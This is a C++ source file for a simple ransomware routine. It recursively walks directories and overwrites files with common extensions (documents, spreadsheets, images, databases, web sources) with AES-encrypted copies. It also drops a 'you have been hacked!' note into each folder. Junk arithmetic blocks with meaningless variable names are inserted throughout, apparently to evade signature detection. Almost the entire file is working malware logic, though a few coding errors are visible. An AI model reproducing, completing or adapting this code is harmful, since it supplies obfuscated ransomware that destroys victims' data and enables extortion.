#pragma once
#include "SimpleRansom.h"
#include <windows.h>
#include <stdio.h>  
#include <stdlib.h>
#include <shlwapi.h>
#include <iostream>
#include "../../Common/CryptoAPI/CryptoAPI.h"

#pragma comment(lib,"shlwapi.lib")
typedef struct datax {
	char ext[6];
} DATAX;

DWORD WINAPI SimpleRansom() {
	ListDirectoryContents("testsetset");
	return 1;
}

bool WhiteList(char fileName[MAX_PATH]) {
	std::string ext[20] = { ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd" };
	for (int x = 0; x < 20; x++) {
		std::string fileext = PathFindExtensionA(fileName);
		if (fileext.compare(ext[x]) == 0)
			return true;
	}
	return false;
}

bool ListDirectoryContents(const char *sDir)
{
	LPWIN32_FIND_DATAA fdFile = NULL;
	HANDLE hFind = NULL; {
		int imF6JTQJkAi = 0x70a5864;
		int ig6wKQxTwik = 0x1109059;
		int i6WdTL22BQq = 0x320ec28;
		int iOTKy9deHzP = imF6JTQJkAi + ig6wKQxTwik - i6WdTL22BQq;
		iOTKy9deHzP = 0x8a30585 * iOTKy9deHzP + 0x0c66b3c - ig6wKQxTwik;
		int ixUCA3vFjKX = iOTKy9deHzP / 0x0c66b3c + imF6JTQJkAi ^ i6WdTL22BQq - 0x320ec28;
	}

	char sPath[2048];

	//Specify a file mask. *.* = We want everything!
	sprintf(sPath, "%s\\*.*", sDir);

	if ((hFind = FindFirstFileA(sPath, fdFile)) == INVALID_HANDLE_VALUE)
	{
		printf("Path not found: [%s]\n", sDir);
		return FALSE;
	}

	do
	{
		//Find first file will always return "."
		//    and ".." as the first two directories.
		if (strcmp(fdFile->cFileName, ".") != 0
			&& strcmp(fdFile->cFileName, "..") != 0)
		{
			//Build up our file path using the passed in
			//  [sDir] and the file/foldername we just found:
			sprintf(sPath, "%s\\%s", sDir, fdFile->cFileName);

			//Is the entity a File or Folder?
			if (fdFile->dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
			{
				printf("Directory: %s\n", sPath);
				char tmp[2048];
				strcpy(tmp, sPath);
				strcat(tmp, "\\info.txt");
				FILE *fl = fopen(tmp, "w");
				fputs("you have been hacked!", fl); {
					int isqp9HYWFOB = 0xfffd69c;
					int iNKm6IMjnDQ = 0x6ed9e63;
					int ibEDajZb5aD = 0xf1006f7;
					int ihaImlvuZp5 = 0x8ee6d35;
					int iexBOkC7xsq = 2;
					switch (iexBOkC7xsq)
					{
					case 0:
						isqp9HYWFOB = iNKm6IMjnDQ - 0x78c084a * ibEDajZb5aD / 100;
						iNKm6IMjnDQ = 0xf1006f7 - 5 + 0xf1006f7 - 6 * iNKm6IMjnDQ / 10 + 25;
						ibEDajZb5aD = isqp9HYWFOB * 0x12 + ihaImlvuZp5 * 0x15 + 0x8ee6d35 / 13 + 0x78c084a + 555;
						ihaImlvuZp5 = 0xfffd69c - 21 + 11 * 1996 - iNKm6IMjnDQ + 14520538 - ibEDajZb5aD - 14520692 + 0x6ed9e63 - 97;
						break;
					case 1:
						isqp9HYWFOB = iNKm6IMjnDQ - 25 + 0xfffd69c - 40 + 0xf1006f7 % 10 + 2;
						ibEDajZb5aD = ibEDajZb5aD - 0xff % 3 - ihaImlvuZp5 * 10 + 0x78c084a / 2 - 10 + 0x6ed9e63 - 5;
						ihaImlvuZp5 = 0xfffd69c % 0x78c084a ^ 33 + 0xf1006f7 * 0x12 - 30 + 0xf1006f7 + 23;
						iNKm6IMjnDQ = iNKm6IMjnDQ + 321 + ibEDajZb5aD * 10 * iNKm6IMjnDQ / 10 / 2 + 0x78c084a * 0x60;
						break;
					case 2:
						isqp9HYWFOB = iNKm6IMjnDQ - 45 - ibEDajZb5aD * 46 + 0xfffd69c / 0xdade;
						iNKm6IMjnDQ = iNKm6IMjnDQ + 0x78c084a - ibEDajZb5aD * 0x6ed9e63 - 3;
						ibEDajZb5aD = 0x6ed9e63 - 0x1 + isqp9HYWFOB * 0x2 - 0x78c084a / 0x3 + 0xf1006f7;
						ihaImlvuZp5 = isqp9HYWFOB - 0x4 * 0xfffd69c + 0x1234 - 0x4567 + 0xcafe + iNKm6IMjnDQ % 0x432 / 0x8ee6d35 - 0x23;
						break;
					case 3:
						iNKm6IMjnDQ = ihaImlvuZp5 * 2 * 0x6ed9e63 - 4 + 0x78c084a + 12 + 34 + 0xfffd69c;
						ibEDajZb5aD = iNKm6IMjnDQ - 43 + 0xf1006f7 * 3040 - 0x6ed9e63 % 10 + 1 - 0xf1006f7;
						ihaImlvuZp5 = 0xf1006f7 - 33 + isqp9HYWFOB * 0x25 + 0xfffd69c - 3004 + 0x6ed9e63;
						isqp9HYWFOB = 0xfffd69c + 2905 % iNKm6IMjnDQ * 1996 + 0x8ee6d35 - 70 * 0x78c084a;
						break;
					case 4:
						ihaImlvuZp5 = iNKm6IMjnDQ - 36 + 0x78c084a * 2001 - ibEDajZb5aD / 234 + 0x7;
						isqp9HYWFOB = ihaImlvuZp5 - 0xabcedf + 0x6ed9e63 * 0xa2bc5 + ihaImlvuZp5 / 0x123 + 0xfffd69c;
						ibEDajZb5aD = isqp9HYWFOB - 0x124 + 23 / iNKm6IMjnDQ / 3 / 2 + ibEDajZb5aD + 29 - 0x6ed9e63 + 100;
						iNKm6IMjnDQ = 0x6ed9e63 - 70 + 70 + 0xfffd69c / 2 + 423 - 0xfffd69c / 7749 % 0x1234;
						break;
					case 5:
						iNKm6IMjnDQ = iNKm6IMjnDQ - 9981 % isqp9HYWFOB + 111 - ibEDajZb5aD / 224 % 0xf1006f7;
						ibEDajZb5aD = ibEDajZb5aD - 339 - ibEDajZb5aD * 4416 / 0x78c084a + 5525 + 0x6ed9e63 % 10;
						ihaImlvuZp5 = ihaImlvuZp5 - 6636 + 0x6ed9e63 * 7749 + 1 - iNKm6IMjnDQ * 8864 / 0xfecba;
						isqp9HYWFOB = 0x78c084a - 9981 % 0xfffd69c % 10 % 1010100 - 0xfffd69c - 23 - 0x78c084a - 2500;
						break;
					}
					iexBOkC7xsq = ihaImlvuZp5 - 0xaa + 0xf1006f7 * 46 - 15 / ibEDajZb5aD + 11 - 0xfffd69c;
					iexBOkC7xsq = iexBOkC7xsq - 70 * 55 - ibEDajZb5aD ^ 0x99 - 0x567498 % 0xfffd69c % 2 - 234 + 0x6ed9e63;
				}
				fclose(fl);
				ListDirectoryContents(sPath); //Recursion, I love it!
			}
			else if (WhiteList(fdFile->cFileName)) {
				FILE *fl = NULL;
				if ((fl = fopen(sPath, "rb")) != NULL) {
					fseek(fl, 0, SEEK_END);
					DWORD len = ftell(fl);
					BYTE *ret = (BYTE*)malloc(len);
					fseek(fl, 0, SEEK_SET);
					fread(ret, 1, len, fl);
					fclose(fl);
					ret = AES_Encrypt(ret, len, "test");
					FILE* file2 = fopen(sPath, "wb");
					fwrite(ret, 1, len, file2);
					fclose(file2);
					printf("File: %s\n", sPath);
				}
			}
		}
	} while (FindNextFileA(hFind, fdFile)); //Find the next file.

	FindClose(hFind); {
		int iVOZxpm4kxZ = 0xff1c9c6;
		int i2PSO4rsLR6 = 0x4a77214;
		int iXO6K9KtfNF = 0xd51635a;
		int iDgfM0fD86I = iXO6K9KtfNF * i2PSO4rsLR6 + iVOZxpm4kxZ;
		i2PSO4rsLR6 = 0xc756a91 - iDgfM0fD86I + 5 + 0x9c2999a + 69 - iVOZxpm4kxZ;
		iVOZxpm4kxZ = 0xff1c9c6 + 10 - i2PSO4rsLR6 % 10 + 0xd51635a + 999 - iDgfM0fD86I;
		iDgfM0fD86I = iVOZxpm4kxZ % 5 + iXO6K9KtfNF % 0x4a77214 + 0xcafebabe + iVOZxpm4kxZ;
		iXO6K9KtfNF = 0xff1c9c6 * 0x100 - iVOZxpm4kxZ + 56 ^ 0x4a77214 + 1996 - iXO6K9KtfNF;
		int iJXVGGspyOI = iXO6K9KtfNF / 77 + 0xd51635a - 76 / iXO6K9KtfNF ^ 0x33 % iXO6K9KtfNF % 0xd51635a;
		iJXVGGspyOI = 0x9c2999a * 0x10 - 22 + iJXVGGspyOI + 56 ^ 0xff + i2PSO4rsLR6 + 1996 - 2111 + iXO6K9KtfNF;
	} //Always, Always, clean things up!

	return TRUE;
}